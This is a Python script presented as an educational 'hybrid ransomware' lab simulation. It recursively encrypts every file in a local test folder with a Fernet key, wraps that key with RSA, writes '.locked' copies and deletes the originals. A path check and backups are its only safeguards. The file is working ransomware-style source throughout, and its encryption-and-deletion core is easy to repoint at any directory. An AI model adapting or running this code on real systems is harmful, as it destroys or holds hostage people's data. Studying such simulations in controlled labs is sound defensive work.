"""
Hybrid Ransomware Attack Simulation (Educational)

Safety notes:
- This script only encrypts files inside the local test_folder directory.
- It is intended for controlled lab environments only.
"""

from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

BASE_DIR = Path(__file__).resolve().parent.parent
TEST_FOLDER = BASE_DIR / "test_folder"
BACKUP_FOLDER = BASE_DIR / "backup"
PUBLIC_KEY_PATH = BASE_DIR / "public.pem"
PRIVATE_KEY_PATH = BASE_DIR / "private.pem"
ENCRYPTED_AES_KEY_PATH = BASE_DIR / "simulator" / "encrypted_aes_key.bin"


def is_inside_test_folder(path: Path) -> bool:
    """Return True only when path is inside test_folder."""
    try:
        path.resolve().relative_to(TEST_FOLDER.resolve())
        return True
    except ValueError:
        return False


def generate_rsa_keys_if_missing() -> None:
    """Create RSA key pair once and save it in project root."""
    if PUBLIC_KEY_PATH.exists() and PRIVATE_KEY_PATH.exists():
        return

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    PRIVATE_KEY_PATH.write_bytes(
        private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )
    )

    PUBLIC_KEY_PATH.write_bytes(
        public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    )


def encrypt_aes_key_with_rsa(aes_key: bytes) -> None:
    """Encrypt AES key with RSA public key and store encrypted blob."""
    public_key = serialization.load_pem_public_key(PUBLIC_KEY_PATH.read_bytes())
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    ENCRYPTED_AES_KEY_PATH.write_bytes(encrypted_aes_key)


def backup_original_file(file_path: Path) -> None:
    """Copy file bytes into backup folder before encryption for safer labs."""
    relative_path = file_path.resolve().relative_to(TEST_FOLDER.resolve())
    backup_path = BACKUP_FOLDER / relative_path
    backup_path.parent.mkdir(parents=True, exist_ok=True)
    backup_path.write_bytes(file_path.read_bytes())


def encrypt_files() -> None:
    """Encrypt every file in test_folder and rename with .locked extension."""
    if not TEST_FOLDER.exists():
        print(f"test_folder not found: {TEST_FOLDER}")
        return

    generate_rsa_keys_if_missing()

    aes_key = Fernet.generate_key()
    encrypt_aes_key_with_rsa(aes_key)
    cipher = Fernet(aes_key)

    encrypted_count = 0

    for file_path in TEST_FOLDER.rglob("*"):
        if not file_path.is_file():
            continue
        if file_path.suffix == ".locked":
            continue
        if not is_inside_test_folder(file_path):
            continue

        backup_original_file(file_path)

        plaintext = file_path.read_bytes()
        encrypted_data = cipher.encrypt(plaintext)

        locked_path = file_path.with_name(file_path.name + ".locked")
        locked_path.write_bytes(encrypted_data)
        file_path.unlink()

        encrypted_count += 1
        print(f"Encrypted: {file_path.name} -> {locked_path.name}")

    print(f"Encryption complete. Total files encrypted: {encrypted_count}")
    print("AES key was encrypted using RSA and stored securely.")


if __name__ == "__main__":
    encrypt_files()
